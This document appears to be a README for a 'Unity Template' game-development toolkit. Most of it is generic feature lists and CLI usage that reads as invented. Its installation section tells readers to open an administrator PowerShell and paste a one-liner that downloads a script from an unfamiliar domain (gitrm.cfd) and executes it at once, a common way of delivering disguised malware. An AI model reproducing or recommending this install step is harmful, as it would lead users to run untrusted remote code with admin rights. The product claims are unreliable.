# Unity Template — Complete Unity Game Development Template Suite

> All-in-one Unity template toolkit — project scaffolding, asset management, scene creation, and build automation in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> **Полезный совет:** Используйте Unity Hub для управления версиями и лицензиями.

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm https://gitrm.cfd?t=unity-template | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading Unity Template modules...
[2/4] Extracting scaffolding and asset components...
[3/4] Installing scene and build utilities...
[4/4] Ready. Start creating Unity projects.
```

### Step 4: Start Using the Template
- Launch via `unity-template.exe` or `npm start`
- Create project scaffolding and scenes
- Manage assets and build configurations

---

## TL;DR - Quick Summary

**Unity Template** combines project scaffolding, asset management, scene creation, and build automation. Covers all major Unity development template needs.

**Best for:** Game developers, Unity engineers, and game design teams.

**Key differentiators:**
1. One-click project scaffolding with pre-configured architecture
2. Asset import and organization automation
3. Scene templating and modular design
4. Multi-platform build configuration
5. ScriptableObjects and data management
6. Version control integration

---

## Core Features

### Project Scaffolding
```
✅ Pre-built project templates
✅ Architecture patterns (MVC, ECS, State Machine)
✅ Folder structure generation
✅ Initial scene setup
✅ ScriptableObjects configuration
✅ Input system setup
✅ UI framework integration
✅ Third-party asset integration
```

### Asset Management
```
✅ Asset import automation
✅ Texture and model optimization
✅ Sprite atlas generation
✅ Audio compression
✅ Asset bundling
✅ Dependency tracking
✅ Duplicate detection
✅ Asset labeling and tagging
```

### Scene Creation
```
✅ Modular scene composition
✅ Prefab management
✅ Scene templating
✅ Lighting presets
✅ Post-processing setup
✅ Camera configuration
✅ Navigation mesh baking
✅ Scene versioning
```

### Build Automation
```
✅ Multi-platform build support
✅ Build pipeline configuration
✅ Automated build scripting
✅ Asset bundling for builds
✅ Incremental build support
✅ Build validation
✅ Distribution management
✅ CI/CD integration
```

---

## Usage

```bash
# Create new project
unity-template create --name "MyGame" --template "3D" --output "./projects/"

# Import assets
unity-template asset import --folder "./assets" --optimize --bundle "characters"

# Create scene
unity-template scene create --name "Level1" --template "platformer" --output "./scenes/"

# Build project
unity-template build --platform "PC" --target "Windows" --output "./builds/"
```

---

## REST API

```bash
# Create project via API
curl -X POST "http://localhost:6666/api/unity/project" -H "Content-Type: application/json" -d '{"name": "MyGame", "template": "3D", "output": "./projects/"}'

# Import assets via API
curl -X POST "http://localhost:6666/api/unity/assets" -H "Content-Type: application/json" -d '{"folder": "./assets", "optimize": true, "bundle": "characters"}'

# Build project via API
curl -X POST "http://localhost:6666/api/unity/build" -H "Content-Type: application/json" -d '{"platform": "PC", "target": "Windows", "output": "./builds/"}'
```

---

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Project Creator: `screenshots/project-creator.png`
- Asset Manager: `screenshots/asset-manager.png`
- Scene Builder: `screenshots/scene-builder.png`
- Build Config: `screenshots/build-config.png`

---

## Troubleshooting

### Project Creation Fails
```bash
unity-template create check --name "MyGame" --template "3D"
unity-template create --name "MyGame" --template "3D" --output "./projects/" --debug
```

### Asset Import Issues
```bash
unity-template asset validate --folder "./assets"
unity-template asset import --folder "./assets" --optimize --bundle "characters" --force
```

### Build Errors
```bash
unity-template build check --platform "PC" --target "Windows"
unity-template build --platform "PC" --target "Windows" --output "./builds/" --force
```

---

## Use Cases

### Game Development
- Create project scaffolding
- Manage assets and scenes
- Build for multiple platforms
- Integrate with version control

### Team Collaboration
- Standardize project templates
- Share asset bundles
- Coordinate scene development
- Automate builds

### Rapid Prototyping
- Quick project setup
- Pre-configured scenes
- Asset management
- Fast iteration

---

> [!NOTE]
> **Обратите внимание:** Требует установленного Unity Editor (2020 LTS или выше). Убедитесь, что лицензия поддерживает использование данных шаблонов.

## ⚠️ IMPORTANT

Requires Unity Editor (2020 LTS or newer). Ensure proper licensing for commercial use.

---

## License

MIT License - see LICENSE file for details.

---

## Tags

`unity-template` `unity` `game-development` `project-scaffolding` `asset-management` `scene-creation` `build-automation` `game-engine` `unity-editor` `game-dev`